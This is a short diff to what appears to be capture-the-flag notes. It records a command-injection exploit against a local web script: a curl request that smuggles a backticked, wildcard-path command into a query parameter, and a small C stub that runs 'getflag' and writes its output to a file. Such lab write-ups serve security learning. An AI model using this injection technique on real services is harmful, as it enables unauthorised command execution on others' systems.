@@ -9,3 +9,5 @@ until now it don't seem to work on the real script but this is maybe because of 
 update: It seems that script didn't use the env PATH to find the exec 
 so the another solution we found is to use wildcard in the path
 final command : curl localhost:4646?x='`/*/*/POUET`'
+
+POUET looks like 'int main() { exec("getflag >/var/crash/gg"); }
